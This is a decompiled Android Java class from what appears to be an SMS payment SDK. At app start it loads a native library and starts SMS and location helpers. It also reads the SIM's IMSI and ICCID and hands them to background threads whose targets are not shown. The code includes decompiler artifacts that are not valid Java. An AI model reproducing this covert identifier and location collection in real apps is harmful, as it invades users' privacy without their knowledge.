package com.jshyproject.price;

import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.text.format.Time;
import com.jshyproject.price.location.LocationHelper;
import com.jshyproject.price.log.PayLogHelper;
import com.jshyproject.price.plus.AppC;
import com.jshyproject.price.ztool.ZPhoneInfo;
import com.jshyproject.price.ztoolsms.SmsHelper;

public class JshyPayApp
{
  public static final String APP_CON = "appcon";
  public static final String IMSI_KEY = "appImsi";
  public static final String IS_INIT_KEY = "appinit";
  public static final String JAR_DATE = "jarDate";
  private static SharedPreferences b;
  Context a;
  
  public JshyPayApp() {}
  
  public static void clearSave(Context paramContext)
  {
    paramContext.getSharedPreferences("phoneInit", 0).edit().remove("sim2").commit();
  }
  
  public static boolean isImsiChange(Context paramContext)
  {
    return !b.getString("appImsi", "").equals(ZPhoneInfo.getIMSI(paramContext));
  }
  
  public static void onCreate(Application paramApplication)
  {
    new JshyPayApp().init(paramApplication);
  }
  
  public void init(Application paramApplication)
  {
    System.loadLibrary("Jshy");
    this.a = paramApplication.getApplicationContext();
    PreData.init(paramApplication);
    SmsHelper.getInstance().init(paramApplication.getApplicationContext());
    initInfo();
    LocationHelper.startLocation(paramApplication);
    PayLogHelper.init(paramApplication);
  }
  
  public void initInfo()
  {
    int j = 1;
    Object localObject = this.a.getSharedPreferences("appcon", 0);
    b = (SharedPreferences)localObject;
    int i;
    if (((SharedPreferences)localObject).getBoolean("appinit", false))
    {
      i = 0;
      if ((i | isImsiChange(this.a)) == 0) {
        break label180;
      }
      NumberInit.clearSave(this.a);
      localObject = ZPhoneInfo.getICCID(this.a);
      new Thread(new b(this, ZPhoneInfo.getIMSI(this.a), (String)localObject)).start();
      label89:
      int k = b.getInt("jarDate", -1);
      localObject = new Time();
      ((Time)localObject).setToNow();
      if (k != -1) {
        break label190;
      }
      i = 1;
      label122:
      if (k == ((Time)localObject).monthDay) {
        break label195;
      }
    }
    for (;;)
    {
      if ((i | j) != 0) {
        new Thread(new a(this)).start();
      }
      AppC.getInstance().setContext(this.a.getApplicationContext());
      AppC.appPlusPoint(1001);
      return;
      i = 1;
      break;
      label180:
      NumberInit.init(this.a);
      break label89;
      label190:
      i = 0;
      break label122;
      label195:
      j = 0;
    }
  }
}
